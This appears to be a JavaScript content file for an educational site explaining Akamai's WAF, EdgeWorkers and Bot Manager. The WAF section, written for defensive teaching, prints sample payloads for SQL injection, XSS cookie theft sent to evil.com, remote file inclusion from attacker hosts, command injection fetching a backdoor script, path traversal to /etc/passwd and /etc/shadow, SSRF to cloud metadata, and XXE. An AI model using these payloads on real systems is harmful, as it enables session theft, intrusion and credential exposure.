        { label: "7. Adaptive Security Engine", description: "Akamai's ML-powered ASE analyzes the request in context. It considers: is this a known false-positive pattern for this application? Does the request match normal behavior? ASE auto-tunes sensitivity and suggests exception rules.", badge: "ML", badgeColor: "accent" },
        { label: "8. Action & Forwarding", description: "Based on all checks: ALLOW (forward clean request to origin), DENY (return 403 with optional custom error page), ALERT (allow but log — used during tuning), or REDIRECT. If allowed, your origin only ever sees clean, validated traffic.", badgeColor: "muted" },
      ],
    },
    visualBlocks: [
      { icon: "💉", label: "Injection Attacks", description: "Detect and block code injection in user input", items: ["SQL Injection (SQLi)", "Command Injection (OS commands)", "LDAP/XPath Injection"] },
      { icon: "📜", label: "Cross-Site Scripting", description: "Block malicious JavaScript injection into pages", items: ["Reflected XSS (via URLs)", "Stored XSS (via form data)", "DOM-based XSS"] },
      { icon: "📂", label: "File Inclusion", description: "Prevent unauthorized file access or remote code execution", items: ["Remote File Inclusion (RFI)", "Local File Inclusion (LFI)", "Path Traversal (../)"] },
      { icon: "🌐", label: "Server-Side Attacks", description: "Stop the server from being weaponized against itself", items: ["SSRF (internal service access)", "XXE (XML parser exploits)", "SSTI (template injection)"] },
      { icon: "🌊", label: "DDoS Protection", description: "Absorb volumetric and application-layer floods", items: ["Layer 3/4: SYN floods, UDP amplification", "Layer 7: HTTP floods, Slowloris", "Rate controls per IP/session"] },
      { icon: "⚙️", label: "Operational", description: "Tuning, monitoring, and adaptive security", items: ["Alert → Deny deployment workflow", "False positive exception rules", "Adaptive Security Engine (ML)"] },
    ],
    concepts: [
      { title: "SQL Injection (SQLi) — The Classic Database Attack", content: "A website has a login form. The backend code does: SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'. An attacker types in the username field: admin' OR 1=1 --. The query becomes: SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = ''. The OR 1=1 is always true, and -- comments out the rest. The attacker is now logged in as admin without knowing the password. The WAF detects patterns like ' OR 1=1, UNION SELECT, --, and SQL keywords in places they should not appear.", codeSnippet: { language: "http", code: `GET /search?q=' OR 1=1 --\nGET /login?user=admin'--&pass=anything\nGET /products?id=1 UNION SELECT username,password FROM users --` } },
      { title: "Cross-Site Scripting (XSS) — Injecting Code Into Pages", content: "A website has a comment box. You type a script tag that steals cookies. If the site does not sanitize input, this script runs in EVERY visitor's browser, stealing their session. Reflected XSS works through URLs. DOM-based XSS manipulates JavaScript directly. Akamai's WAF detects script tags, event handlers, and javascript: URIs in user input.", codeSnippet: { language: "html", code: `<!-- Stored XSS: injected via comment form -->\n<script>document.location='http://evil.com/steal?c='+document.cookie</script>\n\n<!-- Reflected XSS: injected via URL -->\nhttp://example.com/search?q=<script>alert('XSS')</script>\n\n<!-- Event handler XSS -->\n<img src=x onerror="fetch('http://evil.com/'+document.cookie)">` } },
      { title: "Remote File Inclusion (RFI) — Loading Malicious Code", content: "A website has: example.com/page.php?file=about.php. The site includes whatever file is named. An attacker changes it to: ?file=http://badguy.com/evil.php. The site downloads and RUNS evil.php from the attacker's server. This gives the attacker full code execution — stealing data, installing backdoors, or taking over the server entirely.", codeSnippet: { language: "http", code: `# Normal request:\nGET /page.php?file=about.php\n\n# RFI attack — loads remote malicious code:\nGET /page.php?file=http://badguy.com/evil.php\nGET /page.php?file=https://attacker.com/shell.txt` } },
      { title: "Local File Inclusion (LFI) — Reading Server Files", content: "Instead of loading remote files, the attacker uses path traversal to read files already ON the server. The ../ sequences go up directories until reaching sensitive files like /etc/passwd, config files with database credentials, or .env files with API keys.", codeSnippet: { language: "http", code: `# LFI attack — read server files via path traversal:\nGET /page.php?file=../../../../etc/passwd\nGET /page.php?file=....//....//etc/shadow\n\n# URL-encoded variant (bypasses basic filters):\nGET /page.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd\n\n# Read application config:\nGET /page.php?file=../../config/database.yml` } },
      { title: "Command Injection — Running Shell Commands", content: "A website has a diagnostic tool: example.com/ping?host=google.com. The backend runs: ping google.com. An attacker adds: google.com; cat /etc/passwd. The semicolon separates commands — the server runs both. Worst case: the attacker installs a reverse shell and takes full control.", codeSnippet: { language: "http", code: `# Normal request:\nGET /ping?host=google.com\n\n# Command injection attacks:\nGET /ping?host=google.com; cat /etc/passwd\nGET /ping?host=google.com | ls -la /\nGET /ping?host=$(whoami)\nGET /ping?host=google.com && wget http://evil.com/backdoor.sh` } },
      { title: "SSRF — Tricking the Server Into Making Requests", content: "A website lets you preview URLs. An attacker changes the target to http://169.254.169.254/latest/meta-data/ — the AWS metadata endpoint only accessible from inside the server. The server fetches it and returns AWS credentials to the attacker. The 2019 Capital One breach (100M records) was an SSRF attack.", codeSnippet: { language: "http", code: `# Normal request:\nGET /preview?url=http://news-site.com/article\n\n# SSRF attacks — access internal services:\nGET /preview?url=http://169.254.169.254/latest/meta-data/\nGET /preview?url=http://10.0.0.1:8080/admin\nGET /preview?url=http://localhost:6379/  (Redis)` } },
      { title: "XXE — Weaponizing XML Parsers", content: "A website accepts XML uploads. An attacker sends XML with an entity definition that references a local file. The XML parser replaces the entity with the file contents, leaking server files in the response. More dangerous variants can make HTTP requests to internal servers or cause denial of service.", codeSnippet: { language: "xml", code: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<data>&xxe;</data>\n\n<!-- The parser replaces &xxe; with the\n     CONTENTS of /etc/passwd from the server -->` } },
      { title: "DoS vs DDoS — Understanding Denial of Service", content: "DoS (Denial of Service): ONE attacker sends a flood of traffic to overwhelm a target. Like one person calling your phone non-stop so nobody else can reach you. Easier to block — you just block that one IP address. DDoS (Distributed Denial of Service): THOUSANDS or MILLIONS of compromised devices (a 'botnet') all attack simultaneously from different IPs worldwide. Like 10,000 people all calling your phone at once. Much harder to block — you cannot just block one IP because there are millions. Types of DDoS: (1) Volumetric (Layer 3): overwhelm bandwidth with raw traffic. SYN floods, UDP amplification, DNS reflection. Measured in Gbps/Tbps. (2) Protocol (Layer 4): exploit protocol weaknesses. SYN floods exhaust server connection tables. (3) Application (Layer 7): send valid-looking HTTP requests that are expensive to process. Slowloris (keep connections open forever), HTTP floods (millions of GET requests to /search). The largest attacks exceed 1 Tbps — more bandwidth than most organizations have." },
      { title: "How Akamai Prevents DDoS — Multi-Layer Defense", content: "Akamai defends against DDoS at every layer: Layer 3/4 (Network DDoS): Akamai's global network has 1.3+ Tbps of scrubbing capacity distributed across 4,000+ PoPs. When a volumetric attack hits, it is absorbed across the ENTIRE network — no single location takes the full force. Prolexic Routed: For the largest attacks, all your traffic is routed through Akamai's dedicated scrubbing centers via BGP. Malicious traffic is dropped; clean traffic is forwarded to your origin. This happens automatically when attack signatures are detected. Layer 7 (Application DDoS): App & API Protector uses rate controls to limit request frequency per IP/session. Bot Manager detects and blocks automated flood tools. The Adaptive Security Engine identifies abnormal request patterns in real-time. WAF rules catch malicious payloads embedded in flood traffic. Key insight: Akamai does NOT defend your origin directly. It defends by being IN FRONT of your origin. All traffic hits Akamai's edge first — so attacks are absorbed at the edge before they ever reach your infrastructure. Your origin server never sees the attack traffic." },
      { title: "OWASP Top 10 — What Akamai WAF Covers", content: "The OWASP Top 10 is the industry-standard list of critical web application security risks. Akamai's App & API Protector (WAAP) provides protection for most of them: A01 Broken Access Control → WAF header checks, API auth enforcement, rate controls, bot prevention. A02 Cryptographic Failures → TLS enforcement (strong versions/ciphers), data-in-transit protection. A03 Injection (SQLi, NoSQL, OS Command, LDAP, XPath) → One of the strongest areas — dedicated attack group rules with adaptive tuning. A04 Insecure Design → Partial — virtual patching for known CVEs, threat intel updates. A05 Security Misconfiguration → Blocks risky behaviors like unrestricted uploads, exposed debug endpoints. A06 Vulnerable Components → Virtual patching for known CVEs in frameworks/libraries. A07 Authentication Failures → Rate limiting for brute-force, bot detection for credential stuffing. A08 Data Integrity Failures → Some detection and monitoring support. A09 Logging/Monitoring Failures → WAF event logging, SIEM integration, real-time alerting. A10 SSRF → Dedicated rules detecting internal IPs, cloud metadata URLs, and DNS rebinding patterns." },
      { title: "Tuning — The Hardest Part of Running a WAF", content: "Here is the reality: you cannot just turn on a WAF and walk away. Every application has legitimate requests that look suspicious to WAF rules. A search box query like 'SELECT * FROM products WHERE price < 100' triggers SQLi rules — but it is a legitimate user search. This is a false positive. The tuning process: (1) Deploy ALL rules in Alert mode (log but allow). (2) Monitor logs for 1-2 weeks with normal traffic. (3) Identify false positives — legitimate requests being flagged. (4) Create exception rules: 'Disable SQLi rule #950001 for parameter search_query on path /search'. (5) Gradually switch attack groups to Deny mode, one at a time. (6) Keep monitoring — new false positives appear as your app changes. Akamai's Adaptive Security Engine (ASE) helps by auto-suggesting exception rules based on ML analysis of your traffic patterns." },
      { title: "Rate Controls — Application-Layer DDoS Defense", content: "Rate controls defend against Layer 7 (application-layer) attacks — valid-looking HTTP requests at high volume. Unlike network DDoS (raw bandwidth), L7 attacks are harder because each request looks legitimate. How to configure: define a threshold (e.g., 10 requests/minute to /api/login per IP), a time window, a client identifier (IP, session cookie, or custom key), and an action when exceeded (deny, slow down, challenge). Critical endpoints to rate-limit: login (credential stuffing), registration (fake accounts), search/API (scraping), checkout (inventory hoarding). Pro tip: use different identifiers for different endpoints — IP-based for login, session-based for API." },
      { title: "Custom Rules and WAF Modes", content: "Custom rules go beyond standard OWASP rules: Geo-blocking (block countries where you do not operate), admin protection (only allow /admin/* from VPN IPs), header requirements (reject without API key), size limits (reject bodies >10MB), and regex patterns. WAF modes: Alert mode — allowed but logged (use during tuning). Deny mode — blocked with 403 (production mode). Custom action — redirect, serve alternate content. Best practice: run new rules in Alert 2+ weeks before Deny. Start high-confidence groups (SQLi, Command Injection) in Deny and lower-confidence groups (Protocol Attack) in Alert." },
    ],
    comparisons: [
      {
        title: "Three Layers of Protection — Each Catches Different Attacks",
        description: "These are not alternatives — they work together. Network DDoS handles volumetric floods. The WAF handles clever application attacks. Rate controls handle the in-between.",
        items: [
          { icon: "🌐", label: "Network DDoS (Layer 3/4)", description: "Absorbs volumetric attacks that overwhelm bandwidth.", points: ["SYN floods, UDP reflection, DNS amplification, NTP floods", "Akamai's 1.3+ Tbps global capacity absorbs attacks across all PoPs", "Automatic detection — no configuration needed, always on", "Works at the network layer (before HTTP is even parsed)", "99% of DDoS attacks handled here — your WAF never sees them"] },
          { icon: "🛡️", label: "Application WAF (Layer 7)", description: "Inspects HTTP payloads for application-level attacks.", points: ["SQLi, XSS, LFI, RFI, Command Injection, Protocol Attacks", "Inspects: URI, query params, headers, cookies, request body", "Configurable sensitivity (low/medium/high) per attack group", "Exception rules for false positives specific to your app", "OWASP Top 10 coverage out of the box"] },
          { icon: "⏱️", label: "Rate Controls (Layer 7)", description: "Limits request frequency to prevent abuse.", points: ["Per-IP, per-session, or custom key rate limiting", "Protects login, registration, search, API, and checkout", "Configurable thresholds, time windows, and burst allowances", "Actions: deny, slow (tarpit), challenge (CAPTCHA), or alert", "Different from WAF rules — counts requests, not inspects payloads"] },
        ],
      },
    ],
    codeExamples: [
      { title: "WAF Policy Configuration — Real-World Example", language: "json", code: `{
  "securityPolicy": "www-example-com-policy",
  "wafMode": "AAP",
  "attackGroups": {
    "SQL_INJECTION":        { "action": "deny",  "sensitivity": "high"   },
    "CROSS_SITE_SCRIPTING": { "action": "deny",  "sensitivity": "medium" },
    "LOCAL_FILE_INCLUSION": { "action": "deny",  "sensitivity": "high"   },
    "COMMAND_INJECTION":    { "action": "deny",  "sensitivity": "high"   },
    "PROTOCOL_ATTACK":      { "action": "alert", "sensitivity": "low"    }
  },
  "exceptions": [
    {
      "rule": "950001",
      "group": "SQL_INJECTION",
      "reason": "Search box allows SQL-like syntax",
      "condition": "path == '/search' AND parameter == 'q'"
    }
  ],
  "rateControls": [
    {
      "name": "Login Brute Force Protection",
      "path": "/api/login",
      "limit": 10,
      "period": 60,
      "clientIdentifier": "ip",
      "action": "deny"
    }
  ],
  "customRules": [
    {
      "name": "Block Admin from Non-US",
      "condition": "path MATCHES '/admin/*' AND NOT geo.country IN ['US']",
      "action": "deny"
    }
  ]
}` },
      { title: "WAF Alert Log — What You See When a Rule Fires", language: "json", code: `{
  "timestamp": "2024-01-15T14:30:22.456Z",
  "httpMethod": "GET",
  "requestUrl": "/search?q=' OR 1=1 --",
  "clientIp": "198.51.100.42",
  "triggeredRules": [
    {
      "ruleId": "950001",
      "attackGroup": "SQL_INJECTION",
      "message": "SQL Injection Attack Detected",
      "matchedData": "' OR 1=1 --",
      "matchedLocation": "QUERY_STRING.q",
      "action": "DENY"
    }
  ],
  "geo": { "country": "RU", "city": "Moscow" },
  "ipReputation": { "score": 8, "categories": ["web_scanner"] },
  "response": { "status": 403 }
}` },
    ],
    glossary: [
      { title: "WAF & Security Terms", color: "accent", terms: [
        { term: "WAF", definition: "Web Application Firewall — inspects HTTP traffic for attacks at Layer 7" },
        { term: "WAAP", definition: "Web Application and API Protection — Akamai's unified WAF + Bot + DDoS product (App & API Protector)" },
        { term: "SQLi", definition: "SQL Injection — injecting SQL commands through user input to manipulate database queries" },
        { term: "XSS", definition: "Cross-Site Scripting — injecting JavaScript into web pages that runs in other users' browsers" },
        { term: "RFI", definition: "Remote File Inclusion — tricking a server into loading and executing code from an attacker's server" },
        { term: "LFI", definition: "Local File Inclusion — using path traversal (../../) to read files on the server" },
        { term: "SSRF", definition: "Server-Side Request Forgery — tricking the server into making requests to internal services" },
        { term: "XXE", definition: "XML External Entities — weaponizing XML parsers to read files or make internal requests" },
        { term: "Command Injection", definition: "Injecting shell commands (;, |, &&) through user input to execute OS commands" },
        { term: "DoS", definition: "Denial of Service — one attacker overwhelming a target with traffic" },
        { term: "DDoS", definition: "Distributed DoS — thousands/millions of compromised devices attacking simultaneously" },
        { term: "Botnet", definition: "Network of compromised devices (IoT, PCs) controlled by an attacker for DDoS" },
        { term: "OWASP Top 10", definition: "Industry-standard list of the 10 most critical web application security risks" },
        { term: "Layer 3/4 vs 7", definition: "Network-layer attacks (raw floods) vs application-layer (valid HTTP requests)" },
        { term: "Rate Control", definition: "Limiting request frequency per client to prevent brute-force and scraping" },
        { term: "False Positive", definition: "Legitimate request incorrectly blocked — the #1 WAF operational challenge" },
        { term: "Virtual Patching", definition: "WAF rules that block exploitation of known CVEs before you patch your code" },
        { term: "Prolexic", definition: "Akamai's dedicated DDoS scrubbing service with 3-7+ Tbps capacity" },
        { term: "ASE", definition: "Adaptive Security Engine — ML-powered auto-tuning that reduces false positives" },
        { term: "IP Reputation", definition: "Threat score for an IP based on observed behavior across Akamai's network" },
      ]},
    ],
    tips: [
      "ALWAYS deploy WAF rules in Alert mode first — monitor 1-2 weeks before switching to Deny",
      "Start high-confidence groups (SQLi, Command Injection) in Deny, keep Protocol Attack in Alert",
      "Rate-limit your most valuable endpoints first: login, registration, checkout, API search",
      "Review WAF logs weekly — false positives change as your application changes",
      "There is no 'set and forget' WAF. It is a continuous tuning process.",
    ],
    whenToUse: [
      "Your web application needs protection against OWASP Top 10 attacks",
      "DDoS protection is required at both network (Layer 3/4) and application (Layer 7) layers",
      "Rate limiting is needed for login, API, checkout, or brute-force-vulnerable endpoints",
      "Security compliance (PCI DSS, SOC 2, HIPAA) requires a WAF",
    ],
  },

  "akamai-edgeworkers": {
    id: "akamai-edgeworkers",
    hero: {
      badge1: { label: "EW", color: "accent" },
      title: "EdgeWorkers",
      subtitle: "JavaScript at the Edge",
      description: "Akamai EdgeWorkers lets you run custom JavaScript at the CDN edge — intercepting requests and responses to implement logic like A/B testing, header manipulation, geo-routing, API orchestration, and personalization without touching your origin server.",
      highlights: [
        { icon: "⚡", label: "Sub-10ms Execution", detail: "JavaScript runs at the nearest Akamai PoP" },
        { icon: "🔧", label: "Full Lifecycle Control", detail: "Hook into request, origin, and response stages" },
        { icon: "💾", label: "EdgeKV Storage", detail: "Distributed key-value store readable in <10ms" },
        { icon: "🌍", label: "4,000+ Locations", detail: "Code runs on every Akamai edge server globally" },
      ],
      mentalModel: "EdgeWorkers are serverless functions deployed to Akamai's 4,000+ edge servers worldwide. They hook into the HTTP request/response lifecycle at four distinct stages — like middleware, but running at the CDN edge instead of your origin. The key insight: code that runs at the edge runs CLOSE to the user, so operations that would take 200ms from a centralized server take <10ms from the edge. Use cases: A/B test routing (no origin involvement), adding security headers, personalizing responses based on geo/device, aggregating multiple API calls into one response, and serving stale content while revalidating in the background.",
    },
    architecture: {
      sectionLabel: "Execution Lifecycle",
      title: "How EdgeWorkers Hook Into the Request/Response Flow — Step by Step",
      description: "An EdgeWorker has four event handlers, each firing at a specific point in the HTTP lifecycle. Understanding when each fires — and what you can modify at each stage — is the key to using EdgeWorkers effectively.",
      pipeline: [
        { label: "1. Client Sends Request", description: "A user's browser sends an HTTP request to www.example.com. DNS resolves to the nearest Akamai edge PoP. TLS handshake completes. The raw HTTP request is now at the edge server.", badgeColor: "muted" },
        { label: "2. onClientRequest()", description: "FIRST HOOK: Fires as soon as the request arrives at the edge, BEFORE any cache lookup or origin forwarding. You can: read/modify headers, read/modify the URL path, redirect the client (301/302), respond directly without going to origin (e.g., serve cached JSON), route to different origins based on logic (A/B testing, canary deployments), and read EdgeKV data. This is the most commonly used hook.", badge: "EW", badgeColor: "accent" },
        { label: "3. Cache Lookup", description: "After onClientRequest, the edge checks its cache. If the content is cached and fresh (TTL not expired) → skip to onClientResponse. If not cached or stale → proceed to origin. Your EdgeWorker does NOT control this step — caching rules come from Property Manager config and Cache-Control headers.", badgeColor: "muted" },
        { label: "4. onOriginRequest()", description: "SECOND HOOK: Fires just BEFORE the request is sent to your origin server (only if cache missed). You can: modify the origin hostname (route to different backends), add/modify headers sent to origin (authentication tokens, internal routing headers), modify the request path, and add request body content. Use this for origin-side routing logic.", badge: "EW", badgeColor: "accent" },
        { label: "5. Origin Processes Request", description: "Your origin server receives and processes the (potentially modified) request. It returns an HTTP response with status code, headers, and body. The edge receives this response.", badgeColor: "muted" },
        { label: "6. onOriginResponse()", description: "THIRD HOOK: Fires when the response comes back FROM the origin, BEFORE it is cached or sent to the client. You can: modify response headers, change the cache TTL dynamically, transform the response body (JSON manipulation, HTML injection), set cookies, and decide whether to cache this response. Changes here affect what gets cached.", badge: "EW", badgeColor: "accent" },
        { label: "7. onClientResponse()", description: "FOURTH HOOK: Fires just BEFORE the response is sent to the client's browser. This fires for EVERY response — cached or uncached. You can: add security headers (CSP, HSTS, X-Frame-Options), add tracking headers, modify cookies, set CORS headers, and add custom response headers. This is the last chance to modify the response.", badge: "EW", badgeColor: "accent" },
        { label: "8. Response Delivered", description: "The final response — with all EdgeWorker modifications — is sent encrypted (TLS) to the client's browser. Total EdgeWorker execution time is typically <10ms, adding negligible latency to the request.", badgeColor: "muted" },
      ],
    },
    concepts: [
      { title: "The Four Event Handlers — When to Use Each", content: "onClientRequest: Runs on EVERY request (cached or not). Best for: routing decisions, A/B testing, redirects, geo-based logic, blocking requests, responding directly from edge. Most commonly used. onOriginRequest: Only runs on cache MISSES. Best for: modifying what gets sent to origin — adding auth headers, changing the origin hostname, path rewriting. onOriginResponse: Only runs on cache misses. Best for: modifying what gets CACHED — changing TTLs, transforming response bodies, adding headers before caching. onClientResponse: Runs on EVERY response. Best for: adding headers that should NOT be cached (vary per-request), security headers, tracking, CORS." },
      { title: "EdgeKV — Distributed Key-Value Storage", content: "EdgeKV is a distributed key-value store that EdgeWorkers can read from in <10ms. Think of it as a global configuration store at the edge. Use cases: feature flags (enable/disable features without redeployment), A/B test configurations (which users see which variant), geolocation rules (which content to serve per region), blocklists (blocked IPs, spam patterns), and pricing data (serve current prices without origin call). Data is organized into namespaces and groups. Writes propagate globally in ~10 seconds. Reads are local and fast. EdgeKV is eventually consistent — not suitable for strong-consistency use cases like counters or inventory." },
      { title: "Resource Tiers and Limits", content: "EdgeWorkers run in sandboxed V8 isolates with strict resource limits to prevent one customer's code from affecting others. Limits include: execution time (max 50-400ms depending on tier), memory (max 2-8MB), response body size, and sub-requests (HTTP calls to other services). Resource tiers: Dynamic Compute (basic — 50ms CPU, 2MB memory), Enhanced Compute (200ms CPU, 4MB memory), Full Compute (400ms CPU, 8MB memory). If your code exceeds limits, the EdgeWorker is terminated and the request falls through to default behavior. Always test with realistic payloads." },
      { title: "Development and Deployment Workflow", content: "1. Write your EdgeWorker in standard JavaScript (ES6+ supported, no Node.js APIs). 2. Create a bundle.json manifest specifying the EdgeWorker ID and version. 3. Package as a .tgz tarball. 4. Upload via Akamai CLI or API. 5. Activate on staging network for testing. 6. Test using Akamai Sandbox (local development proxy). 7. Activate on production network. 8. Monitor execution metrics in Control Center (duration, memory, errors, invocations). EdgeWorkers support import/export modules, so you can organize code across files." },
      { title: "Common Patterns and Anti-Patterns", content: "Good patterns: A/B routing in onClientRequest (read test config from EdgeKV, route to variant origin). Security headers in onClientResponse (add CSP, HSTS to every response). API aggregation in onClientRequest (call 3 APIs in parallel, merge results, respond directly). Anti-patterns: Heavy computation (image processing, complex parsing — use origin instead). Stateful logic across requests (EdgeWorkers are stateless — use EdgeKV). Blocking synchronous operations (always use async/await). Writing to EdgeKV on every request (writes are slower than reads — batch them)." },
    ],
    comparisons: [
      {
        title: "EdgeWorkers vs. Cloudflare Workers vs. Lambda@Edge",
        description: "All three run code at CDN edge locations, but they differ in execution model, capabilities, and integration.",
        items: [
          { icon: "🔶", label: "Akamai EdgeWorkers", description: "Integrated with Akamai's CDN and security stack.", points: ["Hooks into 4 lifecycle events (request, origin-req, origin-resp, response)", "EdgeKV for distributed key-value storage", "Deep integration with Akamai WAF, Bot Manager, Property Manager", "V8 isolate execution with strict resource tiers", "Best for: existing Akamai customers needing edge logic"] },
          { icon: "🟠", label: "Cloudflare Workers", description: "Largest edge network, most developer-friendly.", points: ["Global network of 300+ cities", "Workers KV, Durable Objects, R2 storage, D1 database", "Wrangler CLI for local development and deployment", "Most generous free tier and lowest latency", "Best for: greenfield edge-first applications"] },
          { icon: "🟡", label: "AWS Lambda@Edge / CloudFront Functions", description: "Integrated with AWS ecosystem.", points: ["CloudFront Functions: lightweight, viewer-request/response only", "Lambda@Edge: full Lambda runtime at CloudFront edge", "Access to entire AWS ecosystem (DynamoDB, S3, SQS)", "Higher cold-start latency than Workers/EdgeWorkers", "Best for: AWS-heavy architectures needing edge logic"] },
        ],
        tip: "Choose based on your existing CDN provider. Migrating edge compute is relatively easy (it is just JavaScript), but migrating CDN + security configurations is much harder.",
      },
    ],
    codeExamples: [
      { title: "EdgeWorker — A/B Test Routing", language: "javascript", code: `// main.js — Route users to different origins for A/B testing
import { EdgeKV } from './edgekv.js';

const edgeKv = new EdgeKV({ namespace: "default", group: "ab-tests" });

export async function onClientRequest(request) {
  // Read A/B test configuration from EdgeKV
  const testConfig = await edgeKv.getText({ item: "homepage-v2" });
  const config = JSON.parse(testConfig || '{"enabled": false}');

  if (!config.enabled) return; // No test running, proceed normally

  // Determine variant: use existing cookie or assign randomly
  let variant = request.getHeader('Cookie')
    ?.match(/ab_variant=(A|B)/)?.[1];

  if (!variant) {
    // New user: assign randomly based on configured split
    variant = Math.random() < config.splitRatio ? 'B' : 'A';
  }

  // Route to appropriate origin based on variant
  if (variant === 'B') {
    request.route({
      origin: 'homepage-v2-origin',  // Defined in Property Manager
      path: request.path
    });
  }

  // Set cookie so user stays in same variant
  request.setHeader('X-AB-Variant', variant);
  // Cookie will be set in onClientResponse
}

export function onClientResponse(request, response) {
  const variant = request.getHeader('X-AB-Variant');
  if (variant) {
    response.addHeader('Set-Cookie',
      \`ab_variant=\${variant}; Path=/; Max-Age=86400; SameSite=Lax\`
    );
  }

  // Always add security headers
  response.setHeader('X-Content-Type-Options', 'nosniff');
  response.setHeader('X-Frame-Options', 'DENY');
  response.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}` },
      { title: "EdgeWorker — API Aggregation at the Edge", language: "javascript", code: `// main.js — Aggregate multiple API calls into one response
// Client makes 1 request; EdgeWorker makes 3 parallel origin calls
import { httpRequest } from 'http-request';
import { createResponse } from 'create-response';

export async function onClientRequest(request) {
  if (request.path !== '/api/dashboard') return;

  // Make 3 API calls to origin IN PARALLEL
  const [userRes, ordersRes, notifRes] = await Promise.all([
    httpRequest('/api/user/profile'),
    httpRequest('/api/user/recent-orders?limit=5'),
    httpRequest('/api/user/notifications?unread=true')
  ]);

  // Parse all responses
  const user = await userRes.json();
  const orders = await ordersRes.json();
  const notifications = await notifRes.json();

  // Merge into single response
  const dashboard = {
    user: user,
    recentOrders: orders.items,
    unreadNotifications: notifications.count,
    generatedAt: new Date().toISOString(),
    servedFrom: 'edge'  // So you know this came from EdgeWorker
  };

  // Respond directly from edge — origin never sees /api/dashboard
  request.respondWith(
    createResponse(200,
      { 'Content-Type': 'application/json' },
      JSON.stringify(dashboard)
    )
  );
}` },
      { title: "bundle.json — EdgeWorker Manifest", language: "json", code: `{
  "edgeworker-version": "1.2.3",
  "description": "Homepage A/B testing + API aggregation",
  "main": "main.js",
  "api-version": "1.0",
  "misc": {
    "author": "Platform Team",
    "repository": "github.com/example/edgeworkers"
  }
}` },
    ],
    glossary: [
      { title: "EdgeWorkers Terms", color: "accent", terms: [
        { term: "EdgeWorker", definition: "Serverless JavaScript function running on Akamai's 4,000+ edge servers" },
        { term: "onClientRequest", definition: "Event handler that fires when a request arrives at the edge (before cache lookup)" },
        { term: "onOriginRequest", definition: "Event handler that fires before a cache-miss request is sent to origin" },
        { term: "onOriginResponse", definition: "Event handler that fires when the origin response arrives (before caching)" },
        { term: "onClientResponse", definition: "Event handler that fires before the response is sent to the client" },
        { term: "EdgeKV", definition: "Distributed key-value store readable by EdgeWorkers in <10ms" },
        { term: "V8 Isolate", definition: "Sandboxed JavaScript execution environment (same engine as Chrome/Node.js)" },
        { term: "Resource Tier", definition: "Execution limits (CPU time, memory) based on subscription level" },
        { term: "Bundle", definition: "Packaged .tgz file containing EdgeWorker code and bundle.json manifest" },
        { term: "Akamai Sandbox", definition: "Local development proxy for testing EdgeWorkers without deploying to production" },
      ]},
    ],
    tips: [
      "Keep EdgeWorker logic fast — heavy computation should happen at origin, not the edge",
      "Use EdgeKV for configuration data (feature flags, A/B configs) that EdgeWorkers read in <10ms",
      "Test EdgeWorkers in staging before production — use Akamai Sandbox for local development",
      "onClientRequest runs on EVERY request (cached or not) — keep it lightweight",
      "onOriginResponse changes affect what gets CACHED — use it to set dynamic TTLs",
      "Monitor execution metrics (duration, memory, errors) in Akamai Control Center",
    ],
    whenToUse: [
      "You need custom logic at the CDN edge (A/B routing, geo-personalization, header manipulation)",
      "API aggregation at the edge can reduce client round trips (3 API calls → 1 response)",
      "Security headers or response modifications need to happen before the client sees the response",
      "Feature flags or configuration should be applied at the edge without origin involvement",
    ],
  },

  "akamai-bot-manager": {
    id: "akamai-bot-manager",
    hero: {
      badge1: { label: "Bot", color: "accent" },
      title: "Bot Manager",
      subtitle: "Bot Classification & Mitigation",
      description: "Akamai Bot Manager detects, classifies, and mitigates automated bot traffic at the edge. It distinguishes good bots (Googlebot, monitoring) from bad bots (scrapers, credential stuffers, inventory hoarders) using behavioral analysis, device fingerprinting, and challenge mechanisms.",
      highlights: [
        { icon: "🤖", label: "1,700+ Bot Signatures", detail: "Known bot classification from Akamai's threat intel" },
        { icon: "🧩", label: "Behavioral Analysis", detail: "ML detects sophisticated bots mimicking humans" },
        { icon: "🎯", label: "Transactional Protection", detail: "Extra protection for login, checkout, account creation" },
        { icon: "📊", label: "Bot Score 0-100", detail: "Granular confidence scoring for every request" },
      ],
      mentalModel: "Not all bots are bad. Googlebot indexes your site; Pingdom checks uptime; Slack unfurls your links. Bot Manager's job is not to block all bots — it is to CLASSIFY each one and apply the right action. The classification pipeline: (1) Check against 1,700+ known bot signatures (User-Agent, IP ranges, behavior). (2) If unknown, run behavioral analysis — does the client execute JavaScript? Does it move a mouse? Does it have normal cookie behavior? (3) Assign a bot score (0 = definitely human, 100 = definitely bot). (4) Apply the configured action based on category and score. The challenge is sophisticated bots that mimic human behavior perfectly — headless Chrome with realistic mouse movements, residential proxy IPs, and normal-looking traffic patterns.",
    },
    architecture: {
      sectionLabel: "Detection Pipeline",
      title: "How Bot Manager Classifies Every Request — Step by Step",
      description: "Each request passes through multiple detection layers. The layers are ordered from cheapest/fastest (signature match) to most expensive/accurate (behavioral ML). This layered approach means most requests are classified quickly, and only ambiguous ones need deeper analysis.",
      pipeline: [
        { label: "1. Request Arrives at Edge", description: "HTTP request arrives at Akamai edge. At this point, Bot Manager has: the client IP, User-Agent header, TLS fingerprint (JA3 hash), request headers, cookies, and the request itself. No client-side signals yet.", badgeColor: "muted" },
        { label: "2. IP Reputation + Known Signatures", description: "First (fastest) check: Does this IP belong to a known bot? Akamai maintains a database of 1,700+ bot signatures mapping IP ranges, User-Agent strings, and behavior patterns to specific bots. Googlebot, Bingbot, Slack, Pingdom — all identified here. If matched → classified immediately (good bot = allow, bad bot = block).", badge: "Bot", badgeColor: "accent" },
        { label: "3. Signature Verification", description: "Claims can be spoofed. An attacker might set User-Agent to 'Googlebot' to bypass rules. Bot Manager verifies claimed identities: for Googlebot, it does a reverse DNS lookup on the client IP — if the IP does not resolve to *.googlebot.com, the claim is fake. This catches a huge number of impersonation attacks.", badge: "Bot", badgeColor: "accent" },
        { label: "4. TLS/HTTP Fingerprinting", description: "Even before any JavaScript runs, the TLS handshake reveals information: JA3 fingerprint (the combination of TLS version, ciphers, and extensions the client supports). Real Chrome, real Firefox, and curl all have different JA3 hashes. A bot using Python's requests library has a very different fingerprint than a real browser. HTTP/2 fingerprinting adds another signal (frame ordering, settings, priorities).", badge: "Bot", badgeColor: "accent" },
